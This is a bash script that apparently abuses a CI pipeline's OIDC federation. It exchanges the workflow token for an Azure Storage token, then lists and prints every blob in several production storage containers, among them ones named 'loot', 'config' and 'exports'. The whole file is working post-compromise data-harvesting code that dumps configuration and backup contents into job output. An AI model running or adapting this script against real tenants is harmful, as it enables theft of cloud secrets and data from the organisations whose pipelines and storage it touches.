#!/usr/bin/env bash
set -uo pipefail
MS="x-ms-version: 2021-08-06"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
ST=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://storage.azure.com/.default" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
g(){ curl -sS -H "Authorization: Bearer $ST" -H "$MS" "$1"; }

for PAIR in "sttblcilogsprodx3euoz:loot" "sttblcilogsprodx3euoz:logs" \
            "sttblappcfgprodx3euoz:config" "sttblbackupprodx3euoz:exports"; do
  ACCT=${PAIR%%:*}; c=${PAIR#*:}
  echo "########## $ACCT / $c : RAW LIST ##########"
  RAW=$(g "https://$ACCT.blob.core.windows.net/$c?restype=container&comp=list")
  echo "$RAW"
  echo "---- doc tung blob ----"
  for b in $(echo "$RAW" | grep -oE '<Name>[^<]+</Name>' | sed -E 's#</?Name>##g'); do
    echo ">>>>> $ACCT/$c/$b"
    g "https://$ACCT.blob.core.windows.net/$c/$b"; echo
  done
done
